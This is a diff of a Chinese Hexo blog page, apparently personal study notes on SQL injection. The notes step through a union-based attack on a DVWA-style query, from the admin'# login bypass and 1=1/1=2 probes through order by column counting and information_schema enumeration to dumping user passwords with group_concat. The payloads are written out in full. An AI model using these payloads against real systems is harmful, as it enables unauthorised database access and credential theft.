@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>我的技术与生活——小站首页 | Hexo</title>
+  <title>我的技术与生活——SQL注入 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <link rel="shortcut icon" href="/imgs/7B3620DD7F3C761C9C25D3F134833D7A_1700579656162.jpeg" type="image/x-icon">
   <link rel="stylesheet" href="/css/public.css" />
@@ -16,7 +16,7 @@
 
   <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
   <script>
-    document.title = `我的技术与生活——小站首页`
+    document.title = `我的技术与生活——SQL注入`
   </script>
 <meta name="generator" content="Hexo 6.3.0"></head>
 
@@ -344,111 +344,144 @@
     </div>
   </div>
 </div></div>
-      <div id="main-container" class="main-container"><link rel="stylesheet" href="/css/partial/archive.css" />
+      <div id="main-container" class="main-container">
 
 
+  <link rel="stylesheet" href="/css/partial/article.css" />
 
-    <link rel="stylesheet" href="/css/partial/index.css" />
-
-
-
-<div class="index">
-  <div class="index-left">
-    
-      <div class="index-article">
-        <!-- <img class="index-article--cover" src="/imgs/default-cover.webp" alt=""> -->
-        <div class="index-article--box">
-          <img class="index-article--cover" data-cover="imgs/default-cover.webp" alt="blog奇葩问题组合" />
-        </div>
-        <div class="index-article--content">
-          <a href="/2024/01/21/blog%E5%A5%87%E8%91%A9%E9%97%AE%E9%A2%98%E7%BB%84%E5%90%88/">blog奇葩问题组合 </a>
-          <div>
-            
+<div class="article-container">
+  <div class="article">
+    <h1 class="article-title">SQL注入</h1>
+    <div class="article-info">
+      <div class="article-info--item">
+        <div class="article-info--info">
+          
+          <div class="article-info--categories">
+            <span>分类：</span>
             
           </div>
-          <div class="bg"></div>
+          
+          
+          <div class="article-info--tags">
+            <span>标签：</span>
+            
+          </div>
+          
+          <p class="article-info--date">日期：2024-02-25 21:37:08</p>
         </div>
+        <img src="/imgs/default-cover.webp" alt="" class="article-cover">
       </div>
+    </div>
+    <article class="article-content markdown-body">
+      <h3 id="1-单引号和注释"><a href="#1-单引号和注释" class="headerlink" title="1.单引号和注释"></a>1.单引号和注释</h3><p>select * from study where username &#x3D;’admin’ union select * from study # ‘ and …..</p>
+<p>黑客破坏</p>
+<p>1.报错</p>
+<p>2.成功登录 admin‘#  注释后面的语句</p>
+<p>3.sql注入</p>
+<hr>
+<h3 id="2-sql注入攻击"><a href="#2-sql注入攻击" class="headerlink" title="2.sql注入攻击"></a>2.sql注入攻击</h3><p>SELECT first_name, last name FROM users WHERE user_id &#x3D; ‘$id’;</p>
+<h4 id="1-页面观察，看是否与数据库有交互"><a href="#1-页面观察，看是否与数据库有交互" class="headerlink" title="1.页面观察，看是否与数据库有交互"></a>1.页面观察，看是否与数据库有交互</h4><p>输入id&#x3D;1和id&#x3D;2，若页面中值有变化，说明与数据库有交互<img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202402252150314.png" alt="image-20240225215004137"></p>
+<h4 id="2-注入点判断"><a href="#2-注入点判断" class="headerlink" title="2.注入点判断"></a>2.注入点判断</h4><p>1‘ and 1&#x3D;1–+（正常输出）  1&#x3D;1没啥含义，随便构造一个就行</p>
+<p>1’ and 1&#x3D;2–+（错误输出）</p>
+<p>SELECT first_name, last name FROM users WHERE user_id &#x3D; ‘1 ‘and 1&#x3D;1 –+ ‘;    –是个注释</p>
+<h5 id="1-判断列-字段数-order-by-column-num-行数"><a href="#1-判断列-字段数-order-by-column-num-行数" class="headerlink" title="(1)判断列&#x2F;字段数 order by [column_num] 行数"></a>(1)判断列&#x2F;字段数 order by [column_num] 行数</h5><p>DRDER BY 关键字可以使查询返回的[结果集] 按照指定的列进行排序，可以按照某[一列排序或者同时按照[多列]进行排序，排序的顺序可以是 [升序] 或者[降序]。<br>SELECT first_name, last_name FROM users WHERE user_id &#x3D; 1’ order by 1#;</p>
+<p>输入 1’order by 1–+和1’ order by 2–+时都返回正常:</p>
+<p>输入1’order by 4–+时返回错误</p>
+<p>由此可知表中只有3个字段，数据为3列</p>
+<h5 id="2-使用union-select联合查询继续获取信息"><a href="#2-使用union-select联合查询继续获取信息" class="headerlink" title="(2)使用union select联合查询继续获取信息"></a>(2)使用union select联合查询继续获取信息</h5><p><strong>1.判断显示位</strong></p>
+<p>判断显示位时，要使用 id&#x3D;.1 或者改为0 让前面的selet语句查询为空错误，然后采用后面的select语句去查询:</p>
+<p>SELECT first name, last_name FROM users WHERE user_id &#x3D; ‘1’ union select 1,2,3#;</p>
+<p>目的：观察页面在哪里回显我们的输入，就可以用那个地方测试接下的语句。</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202402252207523.png" alt="image-20240225220703468"></p>
+<p><strong>2.爆数据库的名字</strong></p>
+<p>user id &#x3D; ‘1’ union select 1,user(),database()–+‘；</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202402252207263.png" alt="image-20240225220757211"></p>
+<p><strong>3.爆数据库中的表</strong></p>
+<p>user_id &#x3D; ‘-1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()–+’;</p>
+<p>Group_concat()函数 将一个分组中的指定元素(列或表达式)的值，拼接成一个字符串返回 (用逗号分隔)</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202402252211349.png" alt="image-20240225221123179"></p>
+<p>MySQL版本大于5.0时，有个<strong>默认数据库information_schema</strong>，里面存放着所有数据库的信息(比如表名、列名、对应权限等)，通过这个数据库，我们就可以跨库查询，爆表爆列。</p>
+<p><strong>4.爆表中的字段</strong></p>
+<p>user_id&#x3D; ‘-1’union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’–+’，</p>
+<p> <strong>5.爆相应字段的所有数据</strong></p>
+<p>user_id &#x3D; ‘-1’ union select 1,2,group_concat(user,password) from users–+’;</p>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="2024/02/25/SQL注入/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
     
   </div>
-  <div class="index-center">
-    
-  </div>
-  <div class="index-right">
-    <div class="index-right-wrapper">
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%92%8C%E6%B3%A8%E9%87%8A"><span class="toc-number">1.</span> <span class="toc-text">1.单引号和注释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-sql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">2.sql注入攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E9%A1%B5%E9%9D%A2%E8%A7%82%E5%AF%9F%EF%BC%8C%E7%9C%8B%E6%98%AF%E5%90%A6%E4%B8%8E%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%89%E4%BA%A4%E4%BA%92"><span class="toc-number">2.1.</span> <span class="toc-text">1.页面观察，看是否与数据库有交互</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%B3%A8%E5%85%A5%E7%82%B9%E5%88%A4%E6%96%AD"><span class="toc-number">2.2.</span> <span class="toc-text">2.注入点判断</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-%E5%88%A4%E6%96%AD%E5%88%97-%E5%AD%97%E6%AE%B5%E6%95%B0-order-by-column-num-%E8%A1%8C%E6%95%B0"><span class="toc-number">2.2.1.</span> <span class="toc-text">(1)判断列&#x2F;字段数 order by [column_num] 行数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8union-select%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E7%BB%A7%E7%BB%AD%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.2.</span> <span class="toc-text">(2)使用union select联合查询继续获取信息</span></a></li></ol></li></ol></li></ol>
+      </div>
       
-      <ul class="tags" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/study/" rel="tag">-study</a></li></ul>
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">2024年02月</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">2024年01月</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">2023年12月</a><span class="archive-list-count">5</span></li></ul>
+        <div class="catelogue catelogue-2">
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a href="/2024/02/02/简单的登录界面/">简单的登录界面</a>
+            </p>
+          
+        </div>
+      
     </div>
   </div>
 </div>
 
 
 <script>
-  var allImgBoxs = document.querySelectorAll('.index-article--box');
-  var windowHeight = window.innerHeight;
-  var boxs = Array.from(allImgBoxs);
-  var timer = null;
-  boxs.forEach((box, idx) => {
-    if (!window.loadImageSet || !window.loadImageSet.includes(idx)) {
-      box.classList.add('img-loading');
-    } else {
-      const imgDom = box.querySelector('img');
-      imgDom.src = imgDom.dataset.cover;
-    }
-  });
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '2024/02/25/SQL注入/'
+  })
+</script>
 
-  function scrollFn() {
-    if (timer) {
-      return;
-    }
-    timer = setTimeout(() => {
-      loadImage();
-      timer = null;
-    }, 100)
-  }
 
-  setTimeout(() => {
-    loadImage();
-  }, 100);
-  if (!window.loadedImage) {
-    document.addEventListener('scroll', scrollFn);
-  }
-
-  function loadImage() {
-    const doc = document.documentElement;
-    const scrollTop = doc.scrollTop;
-    if (boxs.every(box => box.loadedImage)) {
-      document.removeEventListener('scroll', scrollFn);
-      window.loadedImage = 1;
-      return;
-    }
-    boxs.forEach((box, idx) => {
-      if (box.loadedImage) {
-        return;
-      }
-      if (box.getBoundingClientRect().top < windowHeight) {
-        const imgDom = box.querySelector('img');
-        imgDom.src = imgDom.dataset.cover;
-        // 图片成功加载
-        imgDom.onload = () => {
-          box.classList.remove('img-loading');
-          box.loadedImage = true;
-          if (!window.loadImageSet) {
-            window.loadImageSet = [];
-          }
-          window.loadImageSet.push(idx);
-        }
-        // 图片加载失败
-        imgDom.onerror = () => {
-          box.classList.remove('img-loading');
-          box.classList.add('img-error');
-          imgDom.src = '/imgs/404.png';
-        }
-      }
-    });
-  }
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
 </script> 
+
 </div>
       <div class="main-right-wrapper"><div class="main-right">
   <div class="main-right--board">
